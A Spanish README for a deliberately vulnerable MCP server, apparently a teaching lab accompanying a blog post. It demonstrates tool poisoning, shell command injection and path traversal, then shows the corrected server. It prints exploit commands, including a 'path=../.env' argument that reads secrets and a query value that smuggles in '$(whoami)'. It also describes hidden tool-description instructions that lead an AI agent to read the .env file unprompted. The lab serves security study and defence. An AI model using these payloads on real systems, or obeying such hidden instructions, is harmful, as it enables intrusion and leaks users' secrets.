# vulnerable-notes-mcp

Servidor [MCP](https://modelcontextprotocol.io) deliberadamente vulnerable, para reproducir en vivo tres fallas de seguridad que aparecen en servers MCP reales:

1. **Tool poisoning** — instrucciones escondidas en la `description` de una tool, que el modelo lee y obedece sin que la persona las vea nunca.
2. **Command injection** — input sin sanitizar concatenado en un `exec()` de shell.
3. **Path traversal** — un parámetro de ruta que se une al directorio permitido sin validar el resultado.

Acompaña el post [Auditando un servidor MCP: las 3 fallas que nadie está mirando](https://rockysec.com/auditando-servidor-mcp/) en rockysec.com. Ahí está la explicación completa de cada falla, con teoría y mitigación.

**No usar como base de nada real.** El código en `src/vulnerable.ts` existe únicamente para practicar la explotación en un entorno controlado.

## Estructura

```
src/vulnerable.ts   servidor con las 3 fallas
src/fixed.ts        mismo servidor, corregido
agent-demo.mjs      agente real (AI SDK + GPT-4o-mini) contra el server vulnerable
notes/              datos de ejemplo
.env.example        secretos de prueba: es el archivo que filtra el path traversal
```

## Instalación

Requiere Node 20 o superior.

```bash
git clone https://github.com/rockysec/vulnerable-notes-mcp
cd vulnerable-notes-mcp
npm install
cp .env.example .env
```

## Reproducir las fallas

Todos los comandos usan el [MCP Inspector](https://github.com/modelcontextprotocol/inspector) oficial en modo CLI, sin necesidad de un host de IA ni de una API key.

### 1. Ver la tool envenenada tal como la ve el modelo

```bash
npx @modelcontextprotocol/inspector --cli npx tsx src/vulnerable.ts --method tools/list
```

La `description` de `search_notes` sale completa, incluida la instrucción oculta. Ningún host de IA la recorta.

### 2. Uso legítimo, para tener un antes

```bash
npx @modelcontextprotocol/inspector --cli npx tsx src/vulnerable.ts \
  --method tools/call --tool-name read_note --tool-arg path=reunion-equipo.txt
```

### 3. Path traversal: leer `.env` a través de `read_note`

```bash
npx @modelcontextprotocol/inspector --cli npx tsx src/vulnerable.ts \
  --method tools/call --tool-name read_note --tool-arg 'path=../.env'
```

### 4. Command injection: ejecutar `whoami` a través de `search_notes`

```bash
npx @modelcontextprotocol/inspector --cli npx tsx src/vulnerable.ts \
  --method tools/call --tool-name search_notes \
  --tool-arg 'query=nada" ; echo INYECTADO: $(whoami) ; echo "'
```

### 5. Un agente real, sin humano leyendo la tool

```bash
export OPENAI_API_KEY=sk-...
npm run agent-demo
```

Conecta un modelo real al server vulnerable con `@ai-sdk/mcp` y le pide que busque una nota. El script imprime cada `tool_call` que decide hacer el modelo: si obedece la instrucción oculta, va a aparecer una llamada a `read_note` con `../.env` que nadie pidió en el prompt.

## Confirmar las correcciones

Los mismos cuatro comandos, contra `src/fixed.ts`, deberían comportarse así:

```bash
# Sigue funcionando igual
npx @modelcontextprotocol/inspector --cli npx tsx src/fixed.ts \
  --method tools/call --tool-name read_note --tool-arg path=reunion-equipo.txt

# Ahora bloqueado: isError true, "Ruta fuera de notes/"
npx @modelcontextprotocol/inspector --cli npx tsx src/fixed.ts \
  --method tools/call --tool-name read_note --tool-arg 'path=../.env'

# Ahora inerte: "Sin resultados", sin ejecutar whoami
npx @modelcontextprotocol/inspector --cli npx tsx src/fixed.ts \
  --method tools/call --tool-name search_notes \
  --tool-arg 'query=nada" ; echo INYECTADO: $(whoami) ; echo "'
```

## Licencia

MIT.
